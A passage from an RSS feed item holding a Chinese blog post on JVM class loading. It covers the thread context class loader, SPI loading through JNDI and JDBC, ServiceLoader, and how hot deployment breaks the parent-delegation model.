&lt;p&gt;为了解决这个困境，Java的设计团队只好引入了一个不太优雅的设计：线程上下文类加载器（Thread Context ClassLoader）。这个类加载器可以通过java.lang.Thread类的setContext-ClassLoader()方法进行设置，如果创建线程时还未设置，它将会从父线程中继承一个，如果在应用程序的全局范围内都没有设置过的话，那这个类加载器默认就是应用程序类加载器。&lt;/p&gt;
&lt;p&gt;有了线程上下文类加载器，程序就可以做一些“舞弊”的事情了。JNDI服务使用这个线程上下文类加载器去加载所需的SPI服务代码，这是一种父类加载器去请求子类加载器完成类加载的行为，这种行为实际上是打通了双亲委派模型的层次结构来逆向使用类加载器，已经违背了双亲委派模型的一般性原则，但也是无可奈何的事情。Java中涉及SPI的加载基本上都采用这种方式来完成，例如JNDI、JDBC、JCE、JAXB和JBI等。不过，当SPI的服务提供者多于一个的时候，代码就只能根据具体提供者的类型来硬编码判断，为了消除这种极不优雅的实现方式，在JDK 6时，JDK提供了java.util.ServiceLoader类，以META-INF/services中的配置信息，辅以责任链模式，这才算是给SPI的加载提供了一种相对合理的解决方案。&lt;/p&gt;
&lt;h3 id=&quot;第三次被破坏&quot;&gt;第三次被破坏&lt;/h3&gt;
&lt;p&gt;双亲委派模型的第三次“被破坏”是由于用户对程序动态性的追求而导致的，这里所说的“动态性”指的是一些非常“热”门的名词：代码热替换（Hot Swap）、模块热部署（Hot Deployment）等。说白了就是希望Java应用程序能像我们的电脑外设那样，接上鼠标、U盘，不用重启机器就能立即使用，鼠标有问题或要升级就换个鼠标，不用关机也不用重启。对于个人电脑来说，重启一次其实没有什么大不了的，但对于一些生产系统来说，关机重启一次可能就要被列为生产事故，这种情况下热部署就对软件开发者，尤其是大型系统或企业级软件开发者具有很大的吸引力。&lt;/p&gt;
</description>
<pubDate>Mon, 01 Feb 2021 16:11:00 +0000</pubDate>
<dc:creator>等不到的口琴</dc:creator>
<og:description>前言 前文已经讲了虚拟机将java文件编译成class文件后的格式:JVM虚拟机Class类文件研究分析 java文件经过编译,形成class文件,那么虚拟机如何将这些Class文件读取到内存中呢?</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/Courage129/p/14359918.html</dc:identifier>
</item>
</channel>
</rss>